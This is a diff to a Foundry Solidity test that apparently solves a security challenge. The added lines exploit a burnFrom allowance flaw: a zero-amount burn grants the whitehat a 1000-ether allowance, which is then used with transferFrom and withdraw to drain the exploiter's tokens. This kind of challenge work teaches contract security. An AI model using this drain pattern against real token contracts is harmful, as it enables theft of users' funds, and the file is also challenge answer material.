@@ -37,9 +37,12 @@ contract Challenge1Test is Test {
         // forge test --match-contract Challenge1Test -vvvv //
         ////////////////////////////////////////////////////*/
 
-    
-
-        //==================================================//
+        //need to approve exploiter 1000 ether amount to call burnFrom function 
+        //which give approval to whitehat
+        mETH.approve(exploiter, 1000 ether);
+        mETH.burnFrom(exploiter, 0); //update the approval for whitehat with amount = (1000 ether - 0)
+        mETH.transferFrom(exploiter, whitehat, 1000 ether);
+        mETH.withdraw(1000 ether);
         vm.stopPrank();
 
         assertEq(whitehat.balance, 1000 ether, "whitehat should have 1000 ether");
